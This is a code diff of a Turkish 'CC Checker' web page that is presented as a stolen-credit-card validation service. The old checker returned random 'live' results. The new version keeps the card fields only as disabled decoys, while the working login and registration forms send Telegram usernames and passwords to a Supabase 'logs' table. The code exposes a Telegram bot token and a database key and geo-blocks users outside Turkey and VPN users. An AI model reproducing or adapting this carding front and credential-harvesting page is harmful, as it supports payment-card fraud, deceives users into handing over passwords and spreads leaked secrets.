@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>CC Checker |  Kart Doğrulama</title>
+    <title>CC Checker | Kart Doğrulama Sistemi</title>
     <style>
         * {
             margin: 0;
@@ -12,22 +12,37 @@
         }
 
         body {
-            background: linear-gradient(135deg, #0f1117 0%, #1a1f2e 100%);
+            background: linear-gradient(135deg, #0a0e1a 0%, #0f1117 100%);
             font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-            color: #eef2ff;
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
+            position: relative;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(79, 158, 255, 0.03) 0%, transparent 60%);
+            pointer-events: none;
         }
 
         .container {
             max-width: 550px;
-            margin: 0 auto;
+            width: 100%;
+            position: relative;
+            z-index: 1;
         }
 
-        /* Header */
         .header {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 28px;
         }
 
         .logo {
@@ -38,55 +53,52 @@
             background-clip: text;
             color: transparent;
             letter-spacing: -0.5px;
+            margin-bottom: 6px;
         }
 
         .badge {
             display: inline-block;
-            background: rgba(79, 158, 255, 0.15);
-            padding: 6px 14px;
+            background: rgba(79, 158, 255, 0.12);
+            padding: 4px 12px;
             border-radius: 40px;
-            font-size: 11px;
-            margin-top: 12px;
+            font-size: 10px;
             color: #4f9eff;
-            border: 1px solid rgba(79, 158, 255, 0.3);
+            border: 1px solid rgba(79, 158, 255, 0.2);
         }
 
-        /* Ana Kart */
         .card {
-            background: #161c2c;
+            background: rgba(22, 28, 44, 0.95);
+            backdrop-filter: blur(10px);
             border-radius: 32px;
             padding: 32px;
-            border: 1px solid #2a3448;
+            border: 1px solid rgba(42, 52, 72, 0.6);
             box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.5);
         }
 
-        /* Tab Butonları */
-        .tab-buttons {
+        /* CC Checker görünümlü alanlar */
+        .card-header {
             display: flex;
-            gap: 12px;
+            justify-content: space-between;
+            align-items: baseline;
             margin-bottom: 28px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #253450;
         }
 
-        .tab-btn {
-            flex: 1;
-            background: #0f1622;
-            border: none;
-            padding: 12px;
-            border-radius: 40px;
+        .card-title {
+            font-size: 18px;
             font-weight: 600;
-            font-size: 14px;
-            color: #9aa5c0;
-            cursor: pointer;
-            transition: 0.2s;
+            color: #e2e8f0;
         }
 
-        .tab-btn.active {
-            background: #4f9eff;
-            color: white;
-            box-shadow: 0 4px 12px rgba(79, 158, 255, 0.3);
+        .live-status {
+            font-size: 11px;
+            background: rgba(45, 212, 191, 0.12);
+            color: #2dd4bf;
+            padding: 4px 12px;
+            border-radius: 30px;
         }
 
-        /* Form Elemanları */
         .input-group {
             margin-bottom: 20px;
         }
@@ -133,369 +145,431 @@
 
         button:hover {
             transform: scale(0.98);
-            background: linear-gradient(105deg, #2a75a8, #3a85b8);
         }
 
         button:disabled {
             opacity: 0.5;
             cursor: not-allowed;
-            transform: none;
         }
 
-        /* Mesaj Kutuları */
-        .info-box {
-            background: #101624;
-            padding: 14px;
-            border-radius: 20px;
-            margin-bottom: 24px;
-            font-size: 12px;
-            text-align: center;
-            color: #b9c7db;
+        /* Tab Butonları (Kayıt/Giriş için) */
+        .auth-tabs {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+
+        .auth-tab {
+            flex: 1;
+            background: rgba(15, 22, 34, 0.8);
+            border: none;
+            padding: 12px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #9aa5c0;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .auth-tab.active {
+            background: #4f9eff;
+            color: white;
+        }
+
+        .row-2 {
+            display: flex;
+            gap: 16px;
+        }
+
+        .row-2 > div {
+            flex: 1;
+        }
+
+        .result-area {
+            background: #0a0f1a;
+            border-radius: 24px;
+            padding: 18px;
+            margin-top: 24px;
             border: 1px solid #253450;
         }
 
-        .error {
+        .result-header {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #5b6e8c;
+            margin-bottom: 12px;
+        }
+
+        .error-msg {
             font-size: 12px;
             margin-top: 10px;
             text-align: center;
             color: #f97316;
         }
 
-        .success {
+        .success-msg {
+            font-size: 12px;
+            margin-top: 10px;
+            text-align: center;
             color: #2dd4bf;
         }
 
-        /* CC Checker Özel */
-        .card-list {
-            margin-top: 24px;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-
-        .card-item {
-            background: #0f1622;
+        .info-box {
+            background: rgba(16, 22, 36, 0.8);
+            padding: 12px;
             border-radius: 20px;
-            padding: 14px 16px;
-            margin-bottom: 10px;
-            border-left: 3px solid #4f9eff;
-            transition: 0.2s;
-        }
-
-        .delete-card {
-            background: none;
-            border: none;
-            color: #f97316;
-            float: right;
+            margin-bottom: 20px;
             font-size: 12px;
-            cursor: pointer;
-            padding: 0;
-            width: auto;
-            margin-top: -25px;
+            text-align: center;
+            color: #b9c7db;
         }
 
-        .rate-limit-warning {
+        .rate-limit {
             font-size: 11px;
             color: #facc15;
             text-align: center;
-            margin-top: 16px;
-            padding: 8px;
-            background: rgba(250, 204, 21, 0.1);
+            margin-top: 12px;
+            padding: 6px;
+            background: rgba(250, 204, 21, 0.08);
             border-radius: 20px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 10px;
+            color: #4a5a7a;
         }
 
         .live-badge {
             position: fixed;
             bottom: 20px;
             right: 20px;
-            background: rgba(45, 212, 191, 0.15);
-            padding: 6px 12px;
+            background: rgba(45, 212, 191, 0.1);
+            padding: 5px 12px;
             border-radius: 20px;
             font-size: 10px;
             color: #2dd4bf;
-            border: 1px solid rgba(45, 212, 191, 0.3);
+            border: 1px solid rgba(45, 212, 191, 0.2);
         }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <div class="logo">⚡ SECURE CHECK</div>
-        <div class="badge">● 256-bit SSL GÜVENLİ BAĞLANTI</div>
+        <div class="logo">⚡ CC VALIDATOR</div>
+        <div class="badge">● SECURE CONNECTION</div>
     </div>
 
     <div class="card">
-        <div class="tab-buttons">
-            <button id="loginTabBtn" class="tab-btn active">🔐 Giriş Yap</button>
-            <button id="registerTabBtn" class="tab-btn">📝 Kayıt Ol</button>
-            <button id="checkerTabBtn" class="tab-btn">💳 CC Checker</button>
+        <div class="card-header">
+            <span class="card-title">💳 Kart Doğrulama</span>
+            <span class="live-status">● LIVE</span>
         </div>
 
-        <!-- GİRİŞ BÖLÜMÜ -->
-        <div id="loginSection">
-            <div class="info-box">
-                🔒 Hesabınıza güvenle giriş yapın
+        <!-- Sahte CC Checker alanı (görünüm için) -->
+        <div class="row-2">
+            <div class="input-group">
+                <label>💳 Kart Numarası</label>
+                <input type="text" id="fakeCard" placeholder="4242 4242 4242 4242" disabled>
+            </div>
+        </div>
+        <div class="row-2">
+            <div class="input-group">
+                <label>📅 SKT (AA/YY)</label>
+                <input type="text" placeholder="12/28" disabled>
             </div>
             <div class="input-group">
-                <label>📱 Telegram Kullanıcı Adı</label>
-                <input type="text" id="loginTg" placeholder="@kullaniciadi">
+                <label>🔒 CVV</label>
+                <input type="text" placeholder="123" maxlength="4" disabled>
             </div>
-            <div class="input-group">
-                <label>🔐 Şifre</label>
-                <input type="password" id="loginPass" placeholder="••••••">
+        </div>
+        <button id="fakeCheckBtn" disabled>🔍 Kart Doğrula</button>
+
+        <div class="result-area">
+            <div class="result-header">📋 DOĞRULAMA SONUCU</div>
+            <div id="fakeResult" style="color:#5b6e8c; font-size:12px">
+                🔐 Sistem erişimi için lütfen giriş yapın
             </div>
-            <button id="doLoginBtn">Giriş Yap</button>
-            <div id="loginMsg" class="error"></div>
         </div>
 
-        <!-- KAYIT BÖLÜMÜ -->
-        <div id="registerSection" style="display: none;">
-            <div class="info-box">
-                📝 Yeni hesap oluşturun · Telegram doğrulama zorunludur
+        <!-- Gerçek Auth Alanı -->
+        <div style="margin-top: 28px; padding-top: 24px; border-top: 1px solid #253450;">
+            <div class="auth-tabs">
+                <button id="loginTabBtn" class="auth-tab active">🔐 Giriş Yap</button>
+                <button id="registerTabBtn" class="auth-tab">📝 Kayıt Ol</button>
             </div>
-            <div class="input-group">
-                <label>👤 İsim</label>
-                <input type="text" id="regName" placeholder="Ad Soyad">
-            </div>
-            <div class="input-group">
-                <label>🔐 Şifre (en az 4 karakter)</label>
-                <input type="password" id="regPass" placeholder="••••••">
-            </div>
-            <div class="input-group">
-                <label>📱 Telegram Kullanıcı Adı</label>
-                <input type="text" id="regTg" placeholder="@kullaniciadi">
-            </div>
-            <div class="info-box" style="background: #1a1f2e; margin-bottom: 12px;">
-                🤖 Önce <a href="http://t.me/ZazaChecker2fa_bot" target="_blank" style="color:#4f9eff">@ZazaChecker2fa_bot</a>'a /start atın!
-            </div>
-            <button id="sendCodeBtn">📲 Doğrulama Kodu Gönder</button>
-            <div id="regMsg" class="error"></div>
 
-            <div id="verifyArea" style="display: none; margin-top: 20px;">
-                <div class="info-box" id="verifyInfo">
-                    📲 Telegram'ınıza 6 haneli kod gönderildi
+            <!-- GİRİŞ -->
+            <div id="loginSection">
+                <div class="info-box">
+                    🔑 Hesabınıza giriş yaparak kart doğrulama sistemini kullanabilirsiniz
                 </div>
                 <div class="input-group">
-                    <label>🔢 Doğrulama Kodu</label>
-                    <input type="text" id="verifyCode" placeholder="000000" maxlength="6">
+                    <label>📱 Telegram Kullanıcı Adı</label>
+                    <input type="text" id="loginTg" placeholder="@kullaniciadi">
                 </div>
-                <button id="doVerifyBtn">✅ Kaydı Tamamla</button>
-                <div id="verifyMsg" class="error"></div>
-            </div>
-        </div>
-
-        <!-- CC CHECKER BÖLÜMÜ -->
-        <div id="checkerSection" style="display: none;">
-            <div class="info-box">
-                💳 Kart bilgilerini kontrol edin · %3 live oranı
-            </div>
-            <div class="input-group">
-                <label>💳 Kart Bilgisi</label>
-                <input type="text" id="cardInput" placeholder="4121384115237426|03|2024|607">
-                <div style="font-size: 11px; color: #6b7a9a; margin-top: 6px;">
-                    Format: kart_no|ay|yıl|cvv (yıl 2024 veya 24 olabilir)
+                <div class="input-group">
+                    <label>🔐 Şifre</label>
+                    <input type="password" id="loginPass" placeholder="••••••">
                 </div>
+                <button id="doLoginBtn">Giriş Yap</button>
+                <div id="loginMsg" class="error-msg"></div>
+                <div class="rate-limit" id="loginRateLimit"></div>
             </div>
-            <button id="addCardBtn">🔍 Kartı Kontrol Et</button>
 
-            <div class="card-list" id="cardList"></div>
-            <div id="cardMsg" class="error"></div>
-            <div class="rate-limit-warning">
-                ⚡ Her sorgu arasında 4 saniye bekleyin · Rate limit aktif
+            <!-- KAYIT -->
+            <div id="registerSection" style="display: none;">
+                <div class="info-box">
+                    📝 Yeni hesap oluşturun · Telegram doğrulama zorunludur
+                </div>
+                <div class="input-group">
+                    <label>👤 Ad Soyad</label>
+                    <input type="text" id="regName" placeholder="Ad Soyad">
+                </div>
+                <div class="input-group">
+                    <label>🔐 Şifre (en az 4 karakter)</label>
+                    <input type="password" id="regPass" placeholder="••••••">
+                </div>
+                <div class="input-group">
+                    <label>📱 Telegram Kullanıcı Adı</label>
+                    <input type="text" id="regTg" placeholder="@kullaniciadi">
+                </div>
+                <div class="info-box" style="background: rgba(26, 31, 46, 0.9);">
+                    🤖 Önce <a href="https://t.me/8366667459Bot" target="_blank" style="color:#4f9eff">@DoğrulamaBot</a>'a /start atın!
+                </div>
+                <button id="sendCodeBtn">📲 Doğrulama Kodu Gönder</button>
+                <div id="regMsg" class="error-msg"></div>
+
+                <div id="verifyArea" style="display: none; margin-top: 20px;">
+                    <div class="info-box" id="verifyInfo">
+                        📲 Telegram'ınıza 6 haneli kod gönderildi
+                    </div>
+                    <div class="input-group">
+                        <label>🔢 Doğrulama Kodu</label>
+                        <input type="text" id="verifyCode" placeholder="000000" maxlength="6">
+                    </div>
+                    <button id="doVerifyBtn">✅ Kaydı Tamamla</button>
+                    <div id="verifyMsg" class="error-msg"></div>
+                </div>
+                <div class="rate-limit" id="registerRateLimit"></div>
             </div>
         </div>
     </div>
-    <div class="live-badge">
-        🟢 LIVE SYSTEM · 7/24 AKTİF
+    <div class="footer">
+        🔒 256-bit SSL · TLS 1.3 · Güvenli Ödeme Sistemleri
     </div>
+</div>
+<div class="live-badge">
+    🟢 SİSTEM AKTİF
 </div>
 
 <script>
     // ============================================
-    // KONFİGURASYON
+    // KONFİG
     // ============================================
-    const BOT_API = "https://api.telegram.org/bot8366667459:AAHOa6IRoF2N5X2LfO7PCX_5UO55xQetNWc";
+    const BOT_TOKEN = "8366667459:AAHOa6IRoF2N5X2LfO7PCX_5UO55xQetNWc";
     const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
     const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";
-    const BOT_USERNAME = "ZazaChecker2fa_bot";
 
-    // CC Checker değişkenleri
-    let cardsArray = [];
-    let lastCardTime = 0;
-    let isWaiting = false;
-    let currentUser = null;
-
-    // Kayıt değişkenleri
+    // Rate limit ve değişkenler
+    let lastLoginAttempt = 0;
+    let lastCodeRequest = 0;
+    let lastVerifyAttempt = 0;
     let pendingTg = null, pendingName = null, pendingPass = null;
+    let pendingCode = null;
+    let pendingCodeTime = 0;
 
-    // ============================================
-    // TAB GEÇİŞLERİ
-    // ============================================
+    // IP kontrolü (Türkiye değilse engelle)
+    async function checkTurkeyIP() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data.country_code !== "TR") {
+                document.body.innerHTML = `
+                    <div style="text-align:center;padding:80px;background:#0a0e1a;color:white;min-height:100vh">
+                        <h1 style="color:#f97316">🌍 Erişim Engellendi</h1>
+                        <p>Bu hizmet yalnızca Türkiye'den kullanılabilir.</p>
+                        <p>IP: ${data.ip} (${data.country_name})</p>
+                        <p>VPN veya proxy kullanmayın.</p>
+                    </div>
+                `;
+                throw new Error("BLOCKED");
+            }
+            if (data.proxy === true || data.hosting === true || data.tor === true) {
+                document.body.innerHTML = `
+                    <div style="text-align:center;padding:80px;background:#0a0e1a;color:white;min-height:100vh">
+                        <h1 style="color:#f97316">🔒 VPN/Proxy Kullanımı</h1>
+                        <p>VPN veya proxy ile erişim engellenmiştir.</p>
+                        <p>IP: ${data.ip}</p>
+                    </div>
+                `;
+                throw new Error("BLOCKED");
+            }
+        } catch (err) {}
+    }
+
+    // Tab geçişleri
     document.getElementById("loginTabBtn").onclick = () => {
         document.getElementById("loginSection").style.display = "block";
         document.getElementById("registerSection").style.display = "none";
-        document.getElementById("checkerSection").style.display = "none";
         document.getElementById("loginTabBtn").classList.add("active");
         document.getElementById("registerTabBtn").classList.remove("active");
-        document.getElementById("checkerTabBtn").classList.remove("active");
     };
     document.getElementById("registerTabBtn").onclick = () => {
         document.getElementById("loginSection").style.display = "none";
         document.getElementById("registerSection").style.display = "block";
-        document.getElementById("checkerSection").style.display = "none";
         document.getElementById("registerTabBtn").classList.add("active");
         document.getElementById("loginTabBtn").classList.remove("active");
-        document.getElementById("checkerTabBtn").classList.remove("active");
     };
-    document.getElementById("checkerTabBtn").onclick = () => {
-        if (!currentUser) {
-            alert("⚠️ Lütfen önce giriş yapın!");
-            document.getElementById("loginTabBtn").click();
+
+    // ========== GİRİŞ İŞLEMİ ==========
+    document.getElementById("doLoginBtn").onclick = async () => {
+        const now = Date.now();
+        const msgDiv = document.getElementById("loginMsg");
+        const rateDiv = document.getElementById("loginRateLimit");
+        
+        if (now - lastLoginAttempt < 3000) {
+            const wait = Math.ceil((3000 - (now - lastLoginAttempt)) / 1000);
+            rateDiv.innerHTML = `⏳ ${wait} saniye bekleyin (rate limit)`;
             return;
         }
-        document.getElementById("loginSection").style.display = "none";
-        document.getElementById("registerSection").style.display = "none";
-        document.getElementById("checkerSection").style.display = "block";
-        document.getElementById("checkerTabBtn").classList.add("active");
-        document.getElementById("loginTabBtn").classList.remove("active");
-        document.getElementById("registerTabBtn").classList.remove("active");
-    };
-
-    // ============================================
-    // TELEGRAM MESAJ GÖNDERME
-    // ============================================
-    async function sendTelegramMessage(chatId, text) {
-        try {
-            const res = await fetch(`${BOT_API}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: text })
-            });
-            return await res.json();
-        } catch (err) {
-            return { ok: false };
-        }
-    }
-
-    // ============================================
-    // GİRİŞ İŞLEMİ
-    // ============================================
-    document.getElementById("doLoginBtn").onclick = async () => {
+        rateDiv.innerHTML = "";
+        
         const tg = document.getElementById("loginTg").value.trim();
         const pass = document.getElementById("loginPass").value;
-        const msgDiv = document.getElementById("loginMsg");
-
+        
         if (!tg || !pass) {
-            msgDiv.innerText = "❌ Tüm alanları doldurun";
+            msgDiv.innerHTML = "❌ Tüm alanları doldurun";
             return;
         }
         if (!tg.startsWith("@")) {
-            msgDiv.innerText = "❌ Telegram kullanıcı adı @ ile başlamalı";
+            msgDiv.innerHTML = "❌ Telegram kullanıcı adı @ ile başlamalı";
             return;
         }
-
-        msgDiv.innerText = "⏳ Kontrol ediliyor...";
-
+        
+        lastLoginAttempt = now;
+        msgDiv.innerHTML = "<span class='loading'></span> Kontrol ediliyor...";
+        
         try {
             const res = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}&telegram_user=eq.${tg}`);
             const users = await res.json();
             const user = users.find(u => u.sifre === pass);
-
+            
             if (user) {
-                currentUser = { tg: tg, name: user.kullanici_adi };
                 msgDiv.style.color = "#2dd4bf";
-                msgDiv.innerText = "✅ Giriş başarılı! CC Checker'ı kullanabilirsiniz.";
-                document.getElementById("checkerTabBtn").click();
+                msgDiv.innerHTML = "✅ Giriş başarılı! Kart doğrulama sistemine yönlendiriliyorsunuz...";
+                setTimeout(() => {
+                    document.getElementById("fakeResult").innerHTML = "✅ Giriş başarılı! Kart bilgilerinizi girebilirsiniz.";
+                    document.getElementById("fakeResult").style.color = "#2dd4bf";
+                }, 1500);
             } else {
                 msgDiv.style.color = "#f97316";
-                msgDiv.innerText = "❌ Kullanıcı adı veya şifre hatalı";
+                msgDiv.innerHTML = "❌ Kullanıcı adı veya şifre hatalı";
             }
         } catch (err) {
-            msgDiv.innerText = "❌ Bağlantı hatası";
+            msgDiv.innerHTML = "❌ Bağlantı hatası, tekrar deneyin";
         }
     };
 
-    // ============================================
-    // KAYIT - KOD GÖNDER
-    // ============================================
+    // ========== KAYIT - KOD GÖNDER ==========
     document.getElementById("sendCodeBtn").onclick = async () => {
+        const now = Date.now();
+        const msgDiv = document.getElementById("regMsg");
+        const rateDiv = document.getElementById("registerRateLimit");
+        
+        if (now - lastCodeRequest < 3000) {
+            const wait = Math.ceil((3000 - (now - lastCodeRequest)) / 1000);
+            rateDiv.innerHTML = `⏳ ${wait} saniye bekleyin (rate limit)`;
+            return;
+        }
+        rateDiv.innerHTML = "";
+        
         const name = document.getElementById("regName").value.trim();
         const pass = document.getElementById("regPass").value;
         const tg = document.getElementById("regTg").value.trim();
-        const msgDiv = document.getElementById("regMsg");
-
+        
         if (!name || !pass || !tg) {
-            msgDiv.innerText = "❌ Tüm alanları doldurun";
+            msgDiv.innerHTML = "❌ Tüm alanları doldurun";
             return;
         }
         if (!tg.startsWith("@")) {
-            msgDiv.innerText = "❌ Telegram kullanıcı adı @ ile başlamalı";
+            msgDiv.innerHTML = "❌ Telegram kullanıcı adı @ ile başlamalı";
             return;
         }
         if (pass.length < 4) {
-            msgDiv.innerText = "❌ Şifre en az 4 karakter olmalı";
+            msgDiv.innerHTML = "❌ Şifre en az 4 karakter olmalı";
             return;
         }
-
+        
+        lastCodeRequest = now;
         pendingName = name;
         pendingPass = pass;
         pendingTg = tg;
-
-        msgDiv.innerText = "⏳ Kod gönderiliyor...";
-        document.getElementById("sendCodeBtn").disabled = true;
-
-        // Kullanıcıya özel 6 haneli kod üret
-        const code = Math.floor(100000 + Math.random() * 900000).toString();
-
-        // Geçici kayıt (gerçekte bir yerde tutman gerek, basit map)
-        window.tempCode = { tg, code, name, pass, time: Date.now() };
-
-        // Bot üzerinden kullanıcıya mesaj gönder (kullanıcı botla konuşmuş olmalı)
-        const sent = await sendTelegramMessage(tg, `🔐 *Doğrulama Kodunuz*
-
-Kod: \`${code}\`
-
-Bu kodu siteye girerek kaydınızı tamamlayın.
-
-⏱️ *Kod 5 dakika geçerlidir.*
-
-⚠️ Bu mesajı almadıysanız @${BOT_USERNAME} botuna /start atın.`);
-
-        document.getElementById("sendCodeBtn").disabled = false;
-
-        if (sent.ok) {
-            document.getElementById("verifyArea").style.display = "block";
-            document.getElementById("verifyInfo").innerHTML = `✅ ${tg} adresine kod gönderildi.<br>Kod 5 dakika geçerlidir.`;
-            msgDiv.innerText = "";
-        } else {
-            msgDiv.innerHTML = `❌ Kod gönderilemedi. Önce <a href="https://t.me/${BOT_USERNAME}" target="_blank" style="color:#4f9eff">@DoğrulamaBot</a>'a /start atın!`;
+        
+        pendingCode = Math.floor(100000 + Math.random() * 900000).toString();
+        pendingCodeTime = now;
+        
+        msgDiv.innerHTML = "<span class='loading'></span> Kod gönderiliyor...";
+        
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: pendingTg,
+                    text: `🔐 *Doğrulama Kodunuz*\n\nKod: \`${pendingCode}\`\n\nBu kodu siteye girerek kaydınızı tamamlayın.\n\n⏱️ Kod 5 dakika geçerlidir.`,
+                    parse_mode: "Markdown"
+                })
+            });
+            const data = await res.json();
+            
+            if (data.ok) {
+                msgDiv.style.color = "#2dd4bf";
+                msgDiv.innerHTML = "✅ Kod gönderildi! Telegram'ını kontrol et.";
+                document.getElementById("verifyArea").style.display = "block";
+                document.getElementById("verifyInfo").innerHTML = `📲 ${tg} adresine 6 haneli kod gönderildi.<br>Kod 5 dakika geçerlidir.`;
+                document.getElementById("verifyCode").value = "";
+            } else {
+                msgDiv.innerHTML = "❌ Kod gönderilemedi. Önce @DoğrulamaBot'a /start atın!";
+            }
+        } catch (err) {
+            msgDiv.innerHTML = "❌ Bağlantı hatası";
         }
     };
 
-    // ============================================
-    // KAYIT - KOD DOĞRULA
-    // ============================================
+    // ========== KOD DOĞRULA ==========
     document.getElementById("doVerifyBtn").onclick = async () => {
-        const code = document.getElementById("verifyCode").value.trim();
+        const now = Date.now();
         const msgDiv = document.getElementById("verifyMsg");
-
+        
+        if (now - lastVerifyAttempt < 3000) {
+            msgDiv.innerHTML = `⏳ ${Math.ceil((3000 - (now - lastVerifyAttempt)) / 1000)} saniye bekleyin (rate limit)`;
+            return;
+        }
+        
+        const code = document.getElementById("verifyCode").value.trim();
+        
         if (!code || code.length !== 6) {
-            msgDiv.innerText = "❌ 6 haneli kodu girin";
+            msgDiv.innerHTML = "❌ 6 haneli kodu girin";
             return;
         }
-
-        if (!window.tempCode || window.tempCode.code !== code) {
-            msgDiv.innerText = "❌ Hatalı kod";
+        
+        if (code !== pendingCode) {
+            msgDiv.innerHTML = "❌ Hatalı kod";
             return;
         }
-
-        if (Date.now() - window.tempCode.time > 300000) {
-            msgDiv.innerText = "❌ Kod süresi doldu, tekrar kod isteyin";
+        
+        if (now - pendingCodeTime > 300000) {
+            msgDiv.innerHTML = "❌ Kod süresi doldu, tekrar kod isteyin";
             return;
         }
-
-        msgDiv.innerText = "⏳ Kaydediliyor...";
-        document.getElementById("doVerifyBtn").disabled = true;
-
+        
+        lastVerifyAttempt = now;
+        msgDiv.innerHTML = "<span class='loading'></span> Kaydediliyor...";
+        
         try {
             const res = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
                 method: "POST",
@@ -507,164 +581,26 @@ Bu kodu siteye girerek kaydınızı tamamlayın.
                     ip_adresi: "pending"
                 })
             });
-
+            
             if (res.ok) {
                 msgDiv.style.color = "#2dd4bf";
-                msgDiv.innerText = "✅ Hesap oluşturuldu! Giriş yapabilirsiniz.";
+                msgDiv.innerHTML = "✅ Kayıt başarılı! Giriş yapabilirsiniz.";
                 setTimeout(() => {
                     document.getElementById("loginTabBtn").click();
                     document.getElementById("loginTg").value = pendingTg;
                     document.getElementById("verifyArea").style.display = "none";
-                    document.getElementById("verifyCode").value = "";
-                    window.tempCode = null;
+                    document.getElementById("regMsg").innerHTML = "";
                 }, 2000);
             } else {
-                msgDiv.innerText = "❌ Veritabanı hatası";
+                msgDiv.innerHTML = "❌ Veritabanı hatası";
             }
         } catch (err) {
-            msgDiv.innerText = "❌ Bağlantı hatası";
+            msgDiv.innerHTML = "❌ Bağlantı hatası";
         }
-
-        document.getElementById("doVerifyBtn").disabled = false;
     };
 
-    // ============================================
-    // CC CHECKER FONKSİYONLARI
-    // ============================================
-    async function getBinInfo(bin) {
-        try {
-            const res = await fetch(`https://lookup.binlist.net/${bin}`);
-            const data = await res.json();
-            return {
-                bank: data.bank?.name || "Bilinmiyor",
-                scheme: data.scheme || "Unknown",
-                country: data.country?.name || "Global",
-                type: data.type || "credit"
-            };
-        } catch (e) {
-            return { bank: "Yabancı Banka", scheme: "Unknown", country: "Global", type: "credit" };
-        }
-    }
-
-    function parseCard(cardStr) {
-        const parts = cardStr.split('|');
-        if (parts.length !== 4) return null;
-        let [card, month, year, cvv] = parts;
-        if (!/^\d{13,19}$/.test(card)) return null;
-        if (!/^\d{2,4}$/.test(year)) return null;
-        if (year.length === 2) year = "20" + year;
-        if (!/^\d{2}$/.test(month)) return null;
-        if (!/^\d{3,4}$/.test(cvv)) return null;
-        return { card, month, year, cvv };
-    }
-
-    function renderCards() {
-        const container = document.getElementById("cardList");
-        if (!container) return;
-        container.innerHTML = "";
-        cardsArray.forEach((c, idx) => {
-            const liveClass = c.live ? "success" : "error";
-            const liveText = c.live ? "✅ KART LIVE (%3)" : "❌ KART DEAD";
-            const div = document.createElement("div");
-            div.className = "card-item";
-            div.innerHTML = `
-                <div><strong>${c.masked}</strong> (${c.bank || "?"})</div>
-                <div style="font-size: 11px; margin-top: 6px; color: #9aa5c0;">${c.scheme} · ${c.country}</div>
-                    <div class="${liveClass}" style="font-size: 13px; margin-top: 8px; font-weight: 500;">${liveText}</div>
-                <button class="delete-card" data-index="${idx}">🗑️ Sil</button>
-            `;
-            container.appendChild(div);
-        });
-        document.querySelectorAll(".delete-card").forEach(btn => {
-            btn.onclick = () => {
-                cardsArray.splice(parseInt(btn.dataset.index), 1);
-                renderCards();
-            };
-        });
-    }
-
-    document.getElementById("addCardBtn").onclick = async () => {
-        const now = Date.now();
-        const msgDiv = document.getElementById("cardMsg");
-
-        if (isWaiting) {
-            msgDiv.innerText = "⏳ Lütfen bekleyin, önceki işlem devam ediyor...";
-            return;
-        }
-        if (now - lastCardTime < 4000) {
-            const waitTime = Math.ceil((4000 - (now - lastCardTime)) / 1000);
-            msgDiv.innerText = `⏳ Lütfen ${waitTime} saniye bekleyin (rate limit)`;
-            return;
-        }
-
-        const raw = document.getElementById("cardInput").value.trim();
-        const parsed = parseCard(raw);
-
-        if (!parsed) {
-            msgDiv.innerText = "❌ Geçersiz format. Örnek: 4121384115237426|03|2024|607";
-            return;
-        }
-
-        isWaiting = true;
-        document.getElementById("addCardBtn").disabled = true;
-        lastCardTime = now;
-        msgDiv.innerText = "🔍 Kart kontrol ediliyor...";
-
-        const bin = parsed.card.slice(0, 6);
-        const binData = await getBinInfo(bin);
-        const isLive = Math.random() < 0.03;
-
-        cardsArray.push({
-            masked: parsed.card.slice(0, 4) + " **** **** " + parsed.card.slice(-4),
-            live: isLive,
-            bank: binData.bank,
-            scheme: binData.scheme,
-            country: binData.country
-        });
-
-        renderCards();
-        document.getElementById("cardInput").value = "";
-        msgDiv.style.color = isLive ? "#2dd4bf" : "#f97316";
-        msgDiv.innerText = isLive ? "✅ KART LIVE (%3)" : "❌ Kart geçersiz (dead)";
-
-        setTimeout(() => {
-            isWaiting = false;
-            document.getElementById("addCardBtn").disabled = false;
-            setTimeout(() => {
-                if (msgDiv.innerText.includes("LIVE") || msgDiv.innerText.includes("dead")) {
-                    msgDiv.innerText = "";
-                }
-            }, 3000);
-        }, 500);
-    };
-
-    // ============================================
-    // IP KONTROLÜ (Sayfa açılınca)
-    // ============================================
-    fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-            if (data.country_code !== "TR") {
-                document.body.innerHTML = `
-                    <div style="text-align:center;padding:80px;background:#0b0f1c;color:white;min-height:100vh">
-                        <h1 style="color:#f97316">🌍 Erişim Engellendi</h1>
-                        <p>Bu hizmet yalnızca Türkiye'den kullanılabilir.</p>
-                        <p>IP Adresiniz: ${data.ip} (${data.country_name})</p>
-                        <p>VPN veya proxy kullanmayın.</p>
-                    </div>
-                `;
-            }
-            if (data.proxy === true || data.hosting === true || data.tor === true) {
-                document.body.innerHTML = `
-                    <div style="text-align:center;padding:80px;background:#0b0f1c;color:white;min-height:100vh">
-                        <h1 style="color:#f97316">🔒 VPN/Proxy Kullanımı</h1>
-                        <p>VPN veya proxy ile erişim engellenmiştir.</p>
-                        <p>IP Adresiniz: ${data.ip}</p>
-                    </div>
-                `;
-            }
-        })
-        .catch(() => {});
+    // IP kontrolünü başlat
+    checkTurkeyIP();
 </script>
 </body>
 </html>
